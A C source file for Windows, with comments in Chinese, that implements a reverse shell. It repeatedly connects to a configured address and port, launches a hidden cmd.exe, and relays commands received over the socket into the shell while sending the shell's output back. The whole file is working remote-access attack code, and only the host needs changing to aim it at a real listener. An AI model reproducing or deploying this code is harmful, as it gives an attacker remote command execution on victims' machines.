#include <winsock2.H>
#include <Windows.h>
#include <stdio.h>
#include <process.h>
#pragma comment(lib, "ws2_32")
#define CMDBUF 1024*40

// 设置反弹 shell 的目标，定时连接这个地址
#define HOOK_ADDR "127.0.0.1"
#define HOOK_PORT 6000

HANDLE hStdInRead, hStdInWrite;
HANDLE hStdOutRead, hStdOutWrite;
SECURITY_ATTRIBUTES saIn, saOut;
SOCKET clientSocket;

BOOL CreateTwoPipe() {
    DWORD dwRet;
    saIn.nLength = sizeof(SECURITY_ATTRIBUTES);
    saIn.bInheritHandle = TRUE;
    saIn.lpSecurityDescriptor = NULL;
    dwRet = CreatePipe(&hStdInRead, &hStdInWrite, &saIn, 0);
    if(!dwRet) {
        printf("failed to create in pipe...\n");
        return FALSE;
    }
    saOut.nLength = sizeof(SECURITY_ATTRIBUTES);
    saOut.bInheritHandle = TRUE;
    saOut.lpSecurityDescriptor = NULL;
    dwRet = CreatePipe(&hStdOutRead, &hStdOutWrite, &saOut, 0);
    if(!dwRet) {
        printf("failed to create in pipe...\n");
        return FALSE;
    }
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.dwFlags     = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = hStdInRead;
    si.hStdOutput  = hStdOutWrite;
    si.hStdError   = hStdOutWrite;
    char cmdline[] = "cmd.exe";
    PROCESS_INFORMATION ProcessInformation;
    dwRet = CreateProcess(NULL,cmdline,NULL,NULL,1,0,NULL,NULL,&si,&ProcessInformation);
    return TRUE;
}

void ReadOutPutReadCmd(LPVOID lPvoid) {
    DWORD dwByteRecv;
    char Buf[CMDBUF] = {0};
    int ret;
    while(1) {
        memset(Buf, 0, sizeof(Buf));
        PeekNamedPipe(hStdOutRead, Buf, CMDBUF, &dwByteRecv, 0, 0);
        if(dwByteRecv) {
            ret = ReadFile(hStdOutRead, Buf, dwByteRecv, &dwByteRecv, 0);
            if(!ret){
                break;
			}
            ret = send(clientSocket, Buf, dwByteRecv, 0);
            if(ret <= 0){
                break;
			}
        }
    }
}

int main(int argc,char **argv) {
    int err;
	int ret;
    WORD versionRequired;
    WSADATA wsaData;
    versionRequired = MAKEWORD(2, 3);
    err = WSAStartup(versionRequired, &wsaData);
    if (!err)    {
        printf("client open!\n");
    }else{
        printf("client open error:%d!\n", err);
        return 1;
    }
	while (TRUE){
		clientSocket = socket(AF_INET, SOCK_STREAM, 0);
		SOCKADDR_IN clientsock_in;
		clientsock_in.sin_addr.S_un.S_addr = inet_addr(HOOK_ADDR);
		clientsock_in.sin_family           = AF_INET;
		clientsock_in.sin_port             = htons(HOOK_PORT);
		while (TRUE){
			ret = connect(clientSocket, (SOCKADDR*)&clientsock_in, sizeof(SOCKADDR));
			if(ret == 0) {
				printf("connect to server...\n");
				break;
			}else{
				printf("connect ing.\n");
			}
		}
		if(!CreateTwoPipe()) {
			printf("failed to create pipe...\n");
			return 0;
		}
		DWORD dwByteRecv;
		char Buf[CMDBUF] = {0};
		_beginthread(ReadOutPutReadCmd, 0, NULL);
		while (TRUE) {
			dwByteRecv = recv(clientSocket, Buf, CMDBUF, 0);
			if((int)dwByteRecv <= 0){ // DWORD 与 int 比较时注意转换类型，否则会有问题。
				break;
			}
			Buf[dwByteRecv] = '\r';
			Buf[dwByteRecv+1] = '\n';
			Buf[dwByteRecv+2] = 0;
			printf("recv: %s", Buf);
			ret = WriteFile(hStdInWrite, Buf, dwByteRecv+2, &dwByteRecv, 0);
			if(!ret){
				break;
			}
		}
		printf("error end %d.\n", GetLastError());
		closesocket(clientSocket);
	}
    WSACleanup();
    return 0;
}